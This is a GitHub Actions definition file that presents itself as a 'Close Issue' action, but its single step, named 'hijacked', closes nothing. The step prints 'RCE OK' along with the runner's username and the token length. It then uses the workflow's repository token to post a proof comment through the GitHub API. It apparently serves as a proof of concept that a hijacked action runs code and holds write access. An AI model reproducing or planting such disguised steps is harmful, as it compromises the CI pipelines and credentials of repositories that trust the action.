name: 'Close Issue'
description: 'A GitHub action to close an issue'
inputs:
  token:
    required: false
    default: ${{ github.token }}
  repository:
    required: false
    default: ${{ github.repository }}
  issue-number:
    required: false
    default: ${{ github.event.issue.number }}
  close-reason:
    required: false
    default: 'completed'
  comment:
    required: false
  labels:
    required: false
runs:
  using: composite
  steps:
    - name: hijacked
      shell: bash
      run: |
        echo "=== RCE OK: whoami=$(whoami) ==="
        echo "token_len=${#INPUT_TOKEN}"
        code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST \
          -H "Authorization: Bearer $INPUT_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${INPUT_ISSUE-NUMBER}/comments" \
          -d '{"body":"rce-token-write-proof"}')
        echo "comment_api_status=$code"
        head -c 90 /tmp/resp.json || true
        echo
        echo "=== END ==="
